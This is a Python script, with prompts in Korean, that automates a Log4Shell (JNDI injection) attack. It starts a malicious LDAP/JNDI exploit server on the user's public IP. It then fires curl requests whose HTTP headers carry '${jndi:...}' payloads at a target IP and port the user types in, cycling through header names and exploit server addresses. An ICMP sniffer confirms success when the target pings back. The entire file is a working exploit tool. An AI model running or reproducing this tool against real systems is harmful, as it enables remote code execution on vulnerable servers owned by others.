import os
import socket
import os.path
import threading
import time
from requests import get
from scapy.all import*


num = 0
exip = ''
tip = ''

def jar():
    global exip
    exip=get("https://api.ipify.org").text
    try: #서버 구동
        global num
        num = num + 1
        print('start serve : java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "ping -c 1 '+exip+'" -A '+exip)
        os.system('java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "ping -c 1 '+exip+'" -A '+exip)
    except Exception as err: #서버 구동 실패
        print('[@] LDAP 서버가 구동에 실패하였습니다.\n')
        print(err)
        exit(1)
    

def main():
    global tip
    global num
    while True: 
        if num == 1: break
    
    time.sleep(0.5)

    #os.system('clear')
    tip = input('\n[+] 공격을 진행할 서비스의 IP 주소를 작성해주세요.\nEnter : ')
    tpt = input('\n[+] 공격을 진행할 서비스의 PORT를 작성해주세요.\nEnter : ')
    print('\n[+] 당신의 공격 목표가 '+ tip +':'+ tpt +'로 설정되었습니다.')
    time.sleep(0.5)
    os.system('clear')

    headers=(open("./headerlist.txt", 'r')).readlines()
    for i in range(1, len(headers)):
        print('\n'+str(i)+"번째 헤더 : "+str(headers[i]))
    print('\n[+] 전체 헤더 리스트입니다.')
    print('\n[+] 헤더 숫자를 적으면 해당 헤더에 대한 공격을 진행하고, 0을 입력할 경우 전체 리스트를 순차적으로 대입합니다.\n')
    hname = int(input('Enter : '))
    os.system('clear')
    print('[+] 선택한 헤더: ' +str(headers[hname]))

    f = open("./out.txt", 'r')
    fl = f.readlines()
    fnum = 1
    servers=['ALL',]
    for i in range(len(fl)):
        if 'JDK 1.7' in fl[i]:
            print(str(fnum)+'.JDK 1.7 whose trustURLCodebase is true : ' + fl[i+1])
            fnum = fnum+1
            servers.append(fl[i+1].replace("\n", ""))
            print(str(fnum)+'.JDK 1.7 whose trustURLCodebase is true : ' + fl[i+2])
            fnum = fnum+1
            servers.append(fl[i+2].replace("\n", ""))
        elif 'JDK 1.8' in fl[i]:
            print(str(fnum)+'.JDK 1.8 whose trustURLCodebase is true : ' + fl[i+1])
            fnum=fnum+1
            servers.append(fl[i+1].replace("\n", ""))
            print(str(fnum)+'.JDK 1.8 whose trustURLCodebase is true : ' + fl[i+2])
            fnum=fnum+1
            servers.append(fl[i+2].replace("\n", ""))
        elif 'Tomcat' in fl[i]:
            print(str(fnum)+'.JDK whose trustURLCodebase is false and have Tomcat 8+ or SpringBoot 1.2.x+ in classpath : '+fl[i+1])
            fnum=fnum+1
            servers.append(fl[i+1].replace("\n", ""))
            
    print('\n[+] 전체 서버 주소 리스트입니다.')
    print('\n[+] 숫자를 적으면 해당 서버 주소를 이용해 공격을 진행하고, 0을 입력할 경우 전체 리스트를 순차적으로 대입합니다.\n')
    sname = int(input('Enter : '))
    print('[+] 선택한 주소: ' +str(servers[sname]))
    time.sleep(2)
    os.system('clear')

    print('[+] 공격 시작')
    
    if (headers[hname].replace("\n", "") == 'ALL') and (servers[sname] != 'ALL'):
        for x in range(1, len(headers)):
            attcurl = "curl "+tip+":"+tpt+" -H '"+str(headers[x]).replace("\n", "")+": ${jndi:"+str(servers[sname]).replace("\n", "")+"'}"
            print('\n'+attcurl)
            os.system(attcurl)
            time.sleep(0.5)

    elif (headers[hname].replace("\n", "") != 'ALL') and (servers[sname] == 'ALL'):
        for y in range(1, len(servers)):
            attcurl = "curl "+tip+":"+tpt+" -H '"+str(headers[hname]).replace("\n", "")+": ${jndi:"+str(servers[y]).replace("\n", "")+"'}"
            print('\n'+attcurl)
            os.system(attcurl)
            time.sleep(0.5)

    elif (headers[hname].replace("\n", "") == 'ALL') and (servers[sname] == 'ALL'):
        for x in range(1, len(headers)):
            for y in range(1, len(servers)):
                attcurl = "curl "+tip+":"+tpt+" -H '"+str(headers[x]).replace("\n", "")+": ${jndi:"+str(servers[y]).replace("\n", "")+"'}"
                print('\n'+attcurl)
                os.system(attcurl)
                time.sleep(0.5)
    else:
        attcurl = "curl "+tip+":"+tpt+" -H '"+str(headers[hname]).replace("\n", "")+": ${jndi:"+str(servers[sname]).replace("\n", "")+"'}"
        print(attcurl)
        os.system(attcurl)
        time.sleep(1)

def sn(pkt) :
    global tip
    global exip
    if pkt.haslayer(ICMP):
        if socket.gethostbyname(socket.gethostname())==pkt[IP].dst:
            #print(str("[")+str(time)+str("]")+"  "+"ICMP-OUT:{}".format(len(pkt[ICMP]))+" Bytes"+"    "+"IP-Version:"+str(pkt[IP].version) +"    "*1+" SRC-MAC:"+str(pkt.src)+"    "+"DST-MAC:"+str(pkt.dst)+"    "+"SRC-IP: "+str(pkt[IP].src)+ "    "+"DST-IP:  "+str(pkt[IP].dst))
            if (str(pkt[IP].src) == tip):
                print('\n[+] Attack success!\n')
        #if socket.gethostbyname(socket.gethostname())==pkt[IP].src:
            #print(str("[")+str(time)+str("]")+"  "+"ICMP-IN:{}".format(len(pkt[ICMP]))+" Bytes"+"    "+"IP-Version:"+str(pkt[IP].version)+"    "*1+"    SRC-MAC:"+str(pkt.src)+"    "+"DST-MAC:"+str(pkt.dst)+"    "+"SRC-IP: "+str(pkt[IP].src)+ "    "+"DST-IP:  "+str(pkt[IP].dst))

def sp():
    sniff(prn=sn)

if __name__ == '__main__':
    t1=threading.Thread(target=jar)
    t2=threading.Thread(target=sp)
    t1.daemon=True
    t2.daemon=True
    t1.IsBackground=True
    t2.IsBackground=True
    t1.start()
    t2.start()
    main()
